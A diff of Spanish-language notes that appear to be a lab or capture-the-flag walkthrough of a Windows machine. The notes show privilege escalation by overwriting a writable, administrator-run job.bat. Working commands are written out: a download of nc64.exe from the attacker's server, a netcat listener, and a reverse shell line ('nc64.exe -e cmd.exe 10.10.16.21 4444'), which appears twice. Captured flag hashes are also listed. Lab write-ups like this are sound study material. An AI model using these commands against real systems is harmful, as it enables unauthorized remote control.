@@ -160,24 +160,43 @@ ssh -i id_rsa daniel@10.129.127.52 -p 22
 ---
 # Escalada de privilegios a root
 
-
+En la carpeta de logs vemos este archivo llamado *job.bat*
 ![[Markup19.png]]
 
+### Ejecutamos una [[powershell]] para mayor comodidad
 
-Ejecutamos una [[powershell]]
+Vemos los permisos del archivo job.bat con [[icacls]] `icacls job.bat`
+![[Markup20.png]]
+Viendo el contenido de el job.bat se saca la teoria de que se esta ejecutando como administrador, la verdad eso no lo entendi
+Como se esta ejecutando como administrador, vamos a cambiar las instrucciones del job.bat y mandarnos una [[Reverse shell]]
+
+Usamos [[wget]] ``wget http://10.10.16.21:8000/nc64.exe -outfile nc64.exe`` para descargar el archivo, mientras desde nuestra maquina usamos [[python3 -m http.server]]
+
+![[Markup22.png]]
 
 
+Nos ponemos en escucha con [[nc -nlvp 443]]
+![[Markup24.png]]
+
+Y ahora cambiamos la instruccion del `job.exe` para que nos mande la [[Reverse shell]]
+
+*Dato importante:* Probe poniendo doble comillas, comilla simple, capando el -e, pero no me mando la revershell nunca, y si no me aparecia este error, hasta que puse la instruccion de esta forma
+![[Markup23.png]]
+
+```
+cmd /c "echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.16.21 4444 > C:\Log-Management\job.bat"
+
+El cmd/c lo que haces es ejecutar la instruccion desde una terminal normal y no una powershell, por eso el parametro de -e no da problema. Por que en powershell lo interpreta como un parametro ambiguo y desde la terminal como texto plano
+```
+
+#### Y listo ya estamos adentro de la maquina
 
 
-
-
-
-
-
-
-Con [[type]] podemos catear la flag de user.txt que esta en el escritorio del user daniel
+Con [[type]] podemos catear la flag de user.txt que esta en el escritorio del user daniel y la flag de root.txt esta en el escritorio ed administrator
 ![[Markup17.png]]
-032d2fc8952a8c24e39c8f0ee9918ef7
+
+![[Markup25.png]]
+f574a3e7650cebd8c39784299cb570f8
 
 
 ------
@@ -185,6 +204,21 @@ Con [[type]] podemos catear la flag de user.txt que esta en el escritorio del us
 
 #### Si esta activo el servicio ssh, podemos buscar las credenciales en su directorio c:/users/daniel/.ssh/id_rsa
 Para las id_rsa dar el permiso 400 `chmod 400 id_rsa`
+
+
+![[Markup20.png]]
+Builtin/Users representa a todos los usuarios a nivel local
+La F significa full control
+
+### 📌 ¿Qué hace `-UseBasicParsing` en wget?
+
+Le dice a PowerShell que **no use el motor de Internet Explorer** para interpretar la respuesta (lo cual no está disponible en muchos entornos) y que simplemente descargue el archivo de forma cruda.
+
+
+#### cmd /c "echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.16.21 4444 > C:\Log-Management\job.bat"
+
+El cmd/c lo que haces es ejecutar la instruccion desde una terminal normal y no una powershell, por eso el parametro de -e no da problema. Por que en powershell lo interpreta como un parametro ambiguo y desde la terminal como texto plano
+
 
 --------
 # Creditos
